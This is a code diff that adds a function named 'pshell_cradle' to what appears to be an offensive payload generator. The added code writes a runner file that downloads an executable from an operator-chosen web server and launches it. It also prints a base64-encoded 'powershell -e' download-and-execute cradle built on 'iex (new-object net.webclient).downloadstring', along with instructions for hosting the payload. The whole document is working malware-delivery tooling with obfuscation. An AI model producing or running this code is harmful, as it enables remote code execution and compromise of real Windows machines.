@@ -198,3 +198,22 @@ def exeplant():
         print(f'[+] {exe_file} saved to current directory.')
     else:
         print('[-] Some error occured during generation.')
+
+def pshell_cradle():
+    web_server_ip = input('[+] Web server listening host: ')
+    web_server_port = input('[+] Web server port: ')
+    payload_name = input('[+] Payload name: ')
+    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    runner_file = f'{runner_file}.txt'
+    randomized_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    randomized_exe_file = f"{randomized_exe_file}.exe"
+    print(f'[+] Run the following command to start a web server.\npython3 -m http.server -b {web_server_ip} {web_server_port}')
+    runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')" .encode('utf-16le')
+    with open(runner_file, 'w') as f:
+        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomized_exe_file}; Start-Process -FilePath {randomized_exe_file}')
+    f.close()
+    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
+    b64_runner_cal = b64_runner_cal.decode()
+    print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')
+    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
+    print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')
